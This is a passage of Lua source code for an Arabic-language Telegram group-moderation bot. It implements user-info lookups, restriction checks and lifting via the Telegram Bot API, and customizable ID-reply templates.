Text = '𖠧︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n𖠧︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n𖠧︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n𖠧︙رسائله ↫ ❨ '..user_msgs..' ❩\n𖠧︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n𖠧︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙معرفه ↫ [@'..data.username_..']\n𖠧︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n𖠧︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n𖠧︙رسائله ↫ ❨ '..user_msgs..' ❩\n𖠧︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n𖠧︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '𖠧︙نوع الحساب ↫ ❨ '..ch..' ❩\n𖠧︙الايدي ↫ ❨ `'..res.id_..'` ❩\n𖠧︙المعرف ↫ ❨ [@'..username..'] ❩\n𖠧︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '𖠧︙نوع الحساب ↫ ❨ '..gr..' ❩\n𖠧︙الايدي ↫ ❨ '..res.id_..' ❩\n𖠧︙المعرف ↫ ❨ [@'..username..'] ❩\n𖠧︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevAbs:sismember(Venom..'Abs:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(Venom..'Abs:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(Venom..'Abs:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(Venom..'Abs:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n𖠧︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAbs:sismember(Venom..'Abs:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n𖠧︙عدد الكروبات ↫ '..(DevAbs:get(Venom..'Abs:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n𖠧︙لقبه ↫ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الحساب محذوف', 1, 'md')
return false  end
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙معرفه ↫ [@'..data.username_..']\n𖠧︙ايديه ↫ ❨ `'..res.id_..'` ❩\n𖠧︙رتبته ↫ '..IdRank(res.id_, msg.chat_id_)..sudobot..'\n𖠧︙رسائله ↫ ❨ '..user_msgs..' ❩\n𖠧︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n𖠧︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevAbs:sismember(Venom..'Abs:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(Venom..'Abs:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(Venom..'Abs:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(Venom..'Abs:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n𖠧︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAbs:sismember(Venom..'Abs:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n𖠧︙عدد الكروبات ↫ '..(DevAbs:get(Venom..'Abs:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n𖠧︙لقبه ↫ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '𖠧︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..iduser..')\n𖠧︙ايديه ↫ ❨ `'..iduser..'` ❩\n𖠧︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n𖠧︙رسائله ↫ ❨ '..user_msgs..' ❩\n𖠧︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n𖠧︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙معرفه ↫ [@'..data.username_..']\n𖠧︙ايديه ↫ ❨ `'..iduser..'` ❩\n𖠧︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n𖠧︙رسائله ↫ ❨ '..user_msgs..' ❩\n𖠧︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n𖠧︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source Venom     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(Venom..'Abs:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(Venom..'Abs:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAbs:sismember(Venom..'Abs:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAbs:sismember(Venom..'Abs:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الحظر العام ↫ '..banall..'\n𖠧︙الكتم العام ↫ '..muteall..'\n𖠧︙الحظر ↫ '..banned..'\n𖠧︙الكتم ↫ '..muted..'\n𖠧︙التقيد ↫ '..tkeed, 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(Venom..'Abs:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(Venom..'Abs:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAbs:sismember(Venom..'Abs:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAbs:sismember(Venom..'Abs:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙الحظر العام ↫ '..banall..'\n𖠧︙الكتم العام ↫ '..muteall..'\n𖠧︙الحظر ↫ '..banned..'\n𖠧︙الكتم ↫ '..muted..'\n𖠧︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(Venom..'Abs:BanAll:',result.sender_user_id_) DevAbs:srem(Venom..'Abs:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","𖠧︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_,user) DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_,user) DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_,user) DevAbs:srem(Venom..'Abs:BanAll:',user) DevAbs:srem(Venom..'Abs:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_,user) DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_,user) DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_,result.id_) DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_,result.id_) DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_,result.id_) DevAbs:srem(Venom..'Abs:BanAll:',result.id_) DevAbs:srem(Venom..'Abs:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_,result.id_) DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_,result.id_) DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source Venom     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
𖠧︙𝐔𝐒𝐄𝐑 ↬ #username 
𖠧︙𝐈𝐃 ↬ #id
𖠧︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
𖠧︙𝐀𝐔𝐓𝐎 ↬ #cont 
𖠧︙𝐌𝐀𝐒𝐆 ↬ #msgs
𖠧︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
DevAbs:set(Venom.."Abs:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم تغير كليشة الايدي")  
end
--     Source Venom     --
if SecondSudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙رجائا اتبع التعليمات للتعيين \n𖠧︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbs:set("Venom:New:id:"..Venom..msg.sender_user_id_,'VenomTEAM')
return "VenomTEAM"
end
if text and DevAbs:get("Venom:New:id:"..Venom..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbs:del("Venom:New:id:"..Venom..msg.sender_user_id_)
return false
end
DevAbs:del("Venom:New:id:"..Venom..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevAbs:set(Venom.."Abs:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف كليشة الايدي العامه")  
DevAbs:del(Venom.."Abs:AllIds:Text")
end
end
--     Source Venom     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙رجائا اتبع التعليمات للتعيين \n𖠧︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbs:set("Venom:New:id:"..Venom..msg.chat_id_..msg.sender_user_id_,'VenomTEAM')
return "VenomTEAM"
end
if text and Manager(msg) and DevAbs:get("Venom:New:id:"..Venom..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbs:del("Venom:New:id:"..Venom..msg.chat_id_..msg.sender_user_id_)
return false
end
DevAbs:del("Venom:New:id:"..Venom..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ الكليشه الجديده', 1, 'md')
DevAbs:set(Venom.."Abs:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف كليشة الايدي")  
DevAbs:del(Venom.."Abs:GpIds:Text"..msg.chat_id_)
end
end
--     Source Venom     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function VenomTEAM(extra,abbas,success)
if abbas.username_ then username = '@'..abbas.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, abbas, success) 
local msgsday = DevAbs:get(Venom..'Abs:UsersMsgs'..Venom..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevAbs:get(Venom..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbs:get(Venom..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
local Description = Texting[math.random(#Texting)]
if abbas.photos_[0] then
if not DevAbs:get(Venom..'Abs:Lock:Id'..msg.chat_id_) then 
if not DevAbs:get(Venom..'Abs:Lock:Id:Photo'..msg.chat_id_) then 
if DevAbs:get(Venom.."Abs:AllIds:Text") then
newpicid = DevAbs:get(Venom.."Abs:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "𖠧︙"..Description.."\n𖠧︙معرفك ↫ ❨ "..username.." ❩\n𖠧︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n𖠧︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n𖠧︙رسائلك ↫ ❨ "..user_msgs.." ❩\n𖠧︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n𖠧︙تفاعلك ↫ "..formsgs(msguser).."\n𖠧︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbs:get(Venom.."Abs:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevAbs:get(Venom.."Abs:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevAbs:get(Venom.."Abs:AllIds:Text") then
newallid = DevAbs:get(Venom.."Abs:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
